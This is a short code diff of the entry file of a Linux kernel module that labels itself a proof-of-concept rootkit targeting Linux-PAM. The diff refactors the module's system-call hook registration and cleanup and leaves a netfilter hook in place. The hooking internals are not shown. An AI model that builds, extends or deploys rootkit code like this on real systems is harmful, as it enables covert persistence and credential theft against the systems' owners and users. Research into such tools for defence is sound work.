@@ -1,7 +1,7 @@
 #include <linux/init.h>
 #include <linux/module.h>
 
-#include "hooking_framework.h"
+#include "hooking/hooking.h"
 #include "net/net.h"
 #include "sys.h"
 #include "util/sys_checks.h"
@@ -11,6 +11,8 @@
 MODULE_AUTHOR("arm1nt");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("PoC rootkit targeting Linux-PAM");
+
+extern hook_data_t old_pamkit_syscall_hooks[];
 
 static int __init
 pamkit_init(void)
@@ -25,7 +27,7 @@ pamkit_init(void)
         return PAMKIT_GENERIC_ERROR;
     }
 
-    ret = do_syscall_hooking();
+    ret = register_system_call_hooks(old_pamkit_syscall_hooks);
     if (ret) {
         prerr("Failed to register system call hooks");
         return PAMKIT_GENERIC_ERROR;
@@ -42,8 +44,11 @@ pamkit_exit(void)
     prdebug("Starting cleanup to remove module...");
 
     remove_netfilter_hook();
-    undo_syscall_hooking();
 
-    prdebug("Cleanup for removing  module finished!");
+    if (deregister_system_call_hooks(old_pamkit_syscall_hooks)) {
+        prwarn("Unable to de-register the syscall hooks");
+    }
+
+    prdebug("Cleanup for removing module finished!");
 }
 module_exit(pamkit_exit);
